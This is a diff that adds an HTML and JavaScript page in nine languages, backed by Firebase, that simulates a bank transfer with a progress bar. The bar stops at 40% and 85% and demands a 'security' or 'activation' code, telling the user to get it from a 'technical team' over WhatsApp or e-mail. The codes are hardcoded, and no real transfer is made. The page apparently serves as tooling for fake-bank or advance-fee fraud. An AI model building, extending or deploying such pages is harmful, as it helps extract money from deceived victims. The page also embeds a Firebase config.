@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title id="pageTitle">Traitement du transfert</title>
+
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
+
+<style>
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+body{background:#f2f3f7;}
+
+.topbar{
+height:70px;
+background:#0b76d1;
+display:flex;
+align-items:center;
+padding:0 20px;
+color:white;
+font-size:20px;
+font-weight:500;
+}
+
+.container{
+max-width:850px;
+margin:20px auto;
+padding:15px;
+}
+
+.progress-wrapper{
+width:100%;
+height:30px;
+background:#ececec;
+border-radius:4px;
+overflow:hidden;
+}
+
+.progress-bar{
+width:0%;
+height:100%;
+background:#00c853;
+transition:width .3s;
+}
+
+.status,.percent{
+text-align:center;
+margin-top:10px;
+font-size:16px;
+font-weight:600;
+color:#d32f2f;
+}
+
+.card{
+margin-top:20px;
+background:white;
+border:1px solid #ddd;
+}
+
+.card-header{
+padding:15px;
+text-align:center;
+font-weight:600;
+border-bottom:1px solid #ddd;
+}
+
+.card-body{
+padding:15px;
+text-align:center;
+}
+
+input{
+width:100%;
+padding:12px;
+margin-top:10px;
+font-size:16px;
+border:1px solid #ccc;
+border-radius:4px;
+}
+
+.hidden{display:none;}
+
+#stepBox{
+margin-top:15px;
+padding:10px;
+background:#fff8e1;
+border:1px solid #ffd54f;
+}
+
+.buttons{
+display:flex;
+gap:10px;
+margin-top:10px;
+}
+
+.btn{
+flex:1;
+padding:12px;
+border:none;
+cursor:pointer;
+}
+
+.btn-primary{background:#0b76d1;color:white;}
+.btn-warning{background:#f4b400;color:white;}
+
+.home-btn{
+display:none;
+width:100%;
+margin-top:15px;
+padding:14px;
+background:#0b76d1;
+color:white;
+border:none;
+}
+</style>
+</head>
+
+<body>
+
+<div class="topbar" id="topTitle">
+Traitement du transfert
+</div>
+
+<div class="container">
+
+<div class="progress-wrapper">
+<div class="progress-bar" id="progressBar"></div>
+</div>
+
+<div class="status" id="statusText">
+TRANSFERT EN COURS...
+</div>
+<div class="percent" id="percentText">0%</div>
+
+<div class="card">
+
+<div class="card-header" id="cardTitle">
+SUIVI DU TRANSFERT
+</div>
+
+<div class="card-body">
+
+<p id="loadingText">
+Chargement du transfert...
+</p>
+
+<div id="stepBox" class="hidden">
+<p id="stepMessage"></p>
+
+<input 
+type="text" 
+id="virementCode" 
+placeholder="Code sécurisé">
+
+<div class="buttons">
+<button class="btn btn-primary" id="confirmBtn">
+Valider
+</button>
+<button class="btn btn-warning" id="cancelBtn">
+Annuler
+</button>
+</div>
+</div>
+
+</div>
+
+</div>
+
+<button class="home-btn" id="homeBtn">
+Accueil
+</button>
+</div>
+<script type="module">
+
+const browserLang = navigator.language.substring(0,2);
+
+const lang=[
+"fr","en","es","it","pt","de","pl","ru","nl"
+].includes(browserLang)?browserLang:"fr";
+
+const t={
+
+fr:{
+title:"Traitement du transfert",
+status:"TRANSFERT EN COURS...",
+cardTitle:"SUIVI DU TRANSFERT",
+loading:"Chargement du transfert...",
+code:"Code sécurisé",
+confirm:"Valider",
+cancel:"Annuler",
+home:"Accueil",
+finished:"TERMINÉ",
+transfer:"Transfert",
+pending:"EN ATTENTE",
+finishedMessage:"Votre transfert est en cours de traitement bancaire.",
+waitMessage:"Veuillez patienter 2 à 4 jours ouvrables.",
+thanks:"Merci pour votre confiance.",
+activationMessage:"Le code d'activation du transfert est manquant pour finaliser votre transaction. Si vous ne possédez pas ce code, veuillez contacter notre équipe technique par WhatsApp ou par e-mail."
+},
+
+
+en:{
+title:"Transfer Processing",
+status:"TRANSFER IN PROGRESS...",
+cardTitle:"TRANSFER TRACKING",
+loading:"Loading transfer...",
+code:"Security code",
+confirm:"Confirm",
+cancel:"Cancel",
+home:"Home",
+finished:"COMPLETED",
+transfer:"Transfer",
+pending:"PENDING",
+finishedMessage:"Your transfer is being processed by the bank.",
+waitMessage:"Please wait 2 to 4 business days.",
+thanks:"Thank you for your trust.",
+activationMessage:"The transfer activation code is missing to complete your transaction. If you do not have this code, please contact our technical team via WhatsApp or email."
+},
+
+es:{
+title:"Procesamiento de transferencia",
+status:"TRANSFERENCIA EN CURSO...",
+cardTitle:"SEGUIMIENTO DE LA TRANSFERENCIA",
+loading:"Cargando transferencia...",
+code:"Código de seguridad",
+confirm:"Validar",
+cancel:"Cancelar",
+home:"Inicio",
+finished:"TERMINADO",
+transfer:"Transferencia",
+pending:"PENDIENTE",
+finishedMessage:"Su transferencia está siendo procesada por el banco.",
+waitMessage:"Espere de 2 a 4 días hábiles.",
+thanks:"Gracias por su confianza.",
+activationMessage:"Falta el código de activación de la transferencia para finalizar su transacción. Si no posee este código, contacte con nuestro equipo técnico por WhatsApp o correo electrónico."
+},
+
+it:{
+title:"Elaborazione del trasferimento",
+status:"TRASFERIMENTO IN CORSO...",
+cardTitle:"MONITORAGGIO DEL TRASFERIMENTO",
+loading:"Caricamento del trasferimento...",
+code:"Codice di sicurezza",
+confirm:"Confermare",
+cancel:"Annullare",
+home:"Home",
+finished:"COMPLETATO",
+transfer:"Trasferimento",
+pending:"IN ATTESA",
+finishedMessage:"Il tuo trasferimento è in fase di elaborazione bancaria.",
+waitMessage:"Attendi da 2 a 4 giorni lavorativi.",
+thanks:"Grazie per la tua fiducia.",
+activationMessage:"Manca il codice di attivazione del trasferimento per completare la transazione. Se non possiedi questo codice, contatta il nostro team tecnico tramite WhatsApp o e-mail."
+},
+
+pt:{
+title:"Processamento da transferência",
+status:"TRANSFERÊNCIA EM CURSO...",
+cardTitle:"ACOMPANHAMENTO DA TRANSFERÊNCIA",
+loading:"Carregando transferência...",
+code:"Código de segurança",
+confirm:"Validar",
+cancel:"Cancelar",
+home:"Início",
+finished:"CONCLUÍDO",
+transfer:"Transferência",
+pending:"PENDENTE",
+finishedMessage:"Sua transferência está sendo processada pelo banco.",
+waitMessage:"Aguarde de 2 a 4 dias úteis.",
+thanks:"Obrigado pela sua confiança.",
+activationMessage:"O código de ativação da transferência está ausente para finalizar sua transação. Se você não possui este código, entre em contato com nossa equipe técnica pelo WhatsApp ou e-mail."
+},
+
+de:{
+title:"Überweisungsbearbeitung",
+status:"ÜBERWEISUNG LÄUFT...",
+cardTitle:"ÜBERWEISUNGSVERFOLGUNG",
+loading:"Überweisung wird geladen...",
+code:"Sicherheitscode",
+confirm:"Bestätigen",
+cancel:"Abbrechen",
+home:"Startseite",
+finished:"ABGESCHLOSSEN",
+transfer:"Überweisung",
+pending:"AUSSTEHEND",
+finishedMessage:"Ihre Überweisung wird von der Bank bearbeitet.",
+waitMessage:"Bitte warten Sie 2 bis 4 Werktage.",
+thanks:"Vielen Dank für Ihr Vertrauen.",
+activationMessage:"Der Aktivierungscode der Überweisung fehlt, um Ihre Transaktion abzuschließen. Wenn Sie diesen Code nicht besitzen, kontaktieren Sie unser technisches Team per WhatsApp oder E-Mail."
+},
+
+pl:{
+title:"Przetwarzanie przelewu",
+status:"PRZELEW W TOKU...",
+cardTitle:"ŚLEDZENIE PRZELEWU",
+loading:"Ładowanie przelewu...",
+code:"Kod zabezpieczający",
+confirm:"Zatwierdź",
+cancel:"Anuluj",
+home:"Strona główna",
+finished:"ZAKOŃCZONO",
+transfer:"Przelew",
+pending:"OCZEKUJĄCY",
+finishedMessage:"Twój przelew jest przetwarzany przez bank.",
+waitMessage:"Proszę czekać od 2 do 4 dni roboczych.",
+thanks:"Dziękujemy za zaufanie.",
+activationMessage:"Brakuje kodu aktywacyjnego przelewu, aby zakończyć transakcję. Jeśli nie posiadasz tego kodu, skontaktuj się z naszym zespołem technicznym przez WhatsApp lub e-mail."
+},
+
+ru:{
+title:"Обработка перевода",
+status:"ПЕРЕВОД В ПРОЦЕССЕ...",
+cardTitle:"ОТСЛЕЖИВАНИЕ ПЕРЕВОДА",
+loading:"Загрузка перевода...",
+code:"Код безопасности",
+confirm:"Подтвердить",
+cancel:"Отмена",
+home:"Главная",
+finished:"ЗАВЕРШЕНО",
+transfer:"Перевод",
+pending:"В ОЖИДАНИИ",
+finishedMessage:"Ваш перевод обрабатывается банком.",
+waitMessage:"Пожалуйста, подождите от 2 до 4 рабочих дней.",
+thanks:"Спасибо за ваше доверие.",
+activationMessage:"Отсутствует код активации перевода для завершения вашей операции. Если у вас нет этого кода, свяжитесь с нашей технической командой через WhatsApp или электронную почту."
+},
+
+nl:{
+title:"Verwerking van overschrijving",
+status:"OVERSCHRIJVING BEZIG...",
+cardTitle:"OVERSCHRIJVING VOLGEN",
+loading:"Overschrijving laden...",
+code:"Beveiligingscode",
+confirm:"Bevestigen",
+cancel:"Annuleren",
+home:"Home",
+finished:"VOLTOOID",
+transfer:"Overschrijving",
+pending:"IN AFWACHTING",
+finishedMessage:"Uw overschrijving wordt door de bank verwerkt.",
+waitMessage:"Wacht alstublieft 2 tot 4 werkdagen.",
+thanks:"Bedankt voor uw vertrouwen.",
+activationMessage:"De activatiecode van de overschrijving ontbreekt om uw transactie te voltooien. Als u deze code niet heeft, neem dan contact op met ons technisch team via WhatsApp of e-mail."
+},
+
+}[lang];
+
+
+document.title = t.title;
+
+document.querySelector(".topbar").textContent = t.title;
+
+document.getElementById("statusText").textContent = t.status;
+
+document.querySelector(".card-header").textContent = t.cardTitle;
+
+document.querySelector(".card-body p").textContent = t.loading;
+
+document.getElementById("virementCode").placeholder = t.code;
+
+document.getElementById("confirmBtn").textContent = t.confirm;
+
+document.getElementById("cancelBtn").textContent = t.cancel;
+
+document.getElementById("homeBtn").textContent = t.home;
+
+import { initializeApp }
+from "https://www.gstatic.com/firebasejs/12.15.0/firebase-app.js";
+
+import {
+  getFirestore,
+  doc,
+  getDoc,
+  updateDoc,
+  addDoc,
+  deleteDoc,
+  collection,
+  serverTimestamp
+} from "https://www.gstatic.com/firebasejs/12.15.0/firebase-firestore.js";
+
+import { getAuth, onAuthStateChanged }
+from "https://www.gstatic.com/firebasejs/12.15.0/firebase-auth.js";
+
+const app = initializeApp({
+  apiKey: "AIzaSyA3bj3QMqH9fxda8ixe66dSlW-Kb8mD8hk",
+  authDomain: "rfg-finance.firebaseapp.com",
+  projectId: "rfg-finance",
+  storageBucket: "rfg-finance.firebasestorage.app",
+  messagingSenderId: "600995823489",
+  appId: "1:600995823489:web:1a4449f074d14eca05f280"
+});
+
+const db = getFirestore(app);
+const auth = getAuth(app);
+
+const params = new URLSearchParams(location.search);
+const transfertId = params.get("id");
+
+let uid = null;
+let progress = 0;
+let phase = 1;
+let paused = false;
+
+/* UI */
+const progressBar = document.getElementById("progressBar");
+const percentText = document.getElementById("percentText");
+const statusText = document.getElementById("statusText");
+
+const stepBox = document.getElementById("stepBox");
+const stepMessage = document.getElementById("stepMessage");
+
+const confirmBtn = document.getElementById("confirmBtn");
+const cancelBtn = document.getElementById("cancelBtn");
+const homeBtn = document.getElementById("homeBtn");
+
+/* AUTH */
+onAuthStateChanged(auth, (user) => {
+  if (user) uid = user.uid;
+});
+
+/* MESSAGE UNIQUE */
+const MESSAGE = t.activationMessage;
+/* UPDATE TRANSFERT */
+async function updateTransfer(status) {
+  if (!transfertId) return;
+  await updateDoc(doc(db, "transferts", transfertId), {
+    statut: status,
+    updatedAt: serverTimestamp()
+  });
+}
+
+/* HISTORY */
+
+/* LOOP */
+const timer = setInterval(async () => {
+  if (paused) return;
+
+  progress++;
+  if (progress > 100) progress = 100;
+
+  progressBar.style.width = progress + "%";
+  percentText.textContent = progress + "%";
+
+  /* 40% */
+  if (progress === 40 && phase === 1) {
+    paused = true;
+    stepBox.classList.remove("hidden");
+    stepMessage.textContent = MESSAGE;
+  }
+
+  /* 85% */
+  if (progress === 85 && phase === 2) {
+    paused = true;
+    stepBox.classList.remove("hidden");
+    stepMessage.textContent = MESSAGE;
+  }
+
+  /* 100% → DÉBIT UNIQUEMENT ICI */
+  if (progress >= 100) {
+    clearInterval(timer);
+
+    statusText.textContent = t.finished;
+    stepBox.classList.add("hidden");
+
+    document.querySelector(".card-body").innerHTML = `
+<p>${t.finishedMessage}</p>
+<p>${t.waitMessage}</p>
+<p>${t.thanks}</p>
+`;
+
+    homeBtn.style.display = "block";
+
+    try {
+      console.log("transfertId =", transfertId);
+      const ref = doc(db, "transferts", transfertId);
+      const snap = await getDoc(ref);
+      console.log("Document trouvé :", snap.exists());
+
+if (snap.exists()) {
+  console.log(snap.data());
+}
+
+      if (snap.exists()) {
+        const data = snap.data();
+        console.log("Données du transfert :", data);
+        const montant = Number(data.montant || 0);
+        const userId = data.uid;
+
+        await updateTransfer("EN ATTENTE");
+        await addDoc(collection(db,"historique"),{
+  uid: userId,
+  type: "TRANSFERT",
+  transactionId: data.transactionId,
+  montant: data.montant,
+  devise: data.devise || deviseUtilisateur,
+  iban: data.iban,
+  bic: data.bic,
+  beneficiaire: data.beneficiaire,
+  dateExecution: data.dateExecution,
+  motif: data.motif,
+  type: t.transfer,
+  statut: t.pending,
+  date: serverTimestamp()
+});
+      }
+    } catch (e) {
+      console.error(e);
+    }
+  }
+}, 120);
+
+/* CONFIRM */
+confirmBtn.onclick = () => {
+  const code = document.getElementById("virementCode").value.trim();
+
+  if (phase === 1 && code === "6166") {
+    phase = 2;
+    paused = false;
+    stepBox.classList.add("hidden");
+  } 
+  else if (phase === 2 && code === "9541") {
+    phase = 3;
+    paused = false;
+    stepBox.classList.add("hidden");
+  }
+};
+
+/* CANCEL */
+cancelBtn.onclick = async () => {
+  clearInterval(timer);
+
+  try {
+    if (transfertId) {
+      await deleteDoc(doc(db, "transferts", transfertId));
+    }
+  } catch (e) {
+    console.error(e);
+  }
+
+  location.href = "dashboard.html";
+};
+
+/* HOME */
+homeBtn.onclick = () => {
+  location.href = "dashboard.html";
+};
+</script>
+
+</body>
+</html>
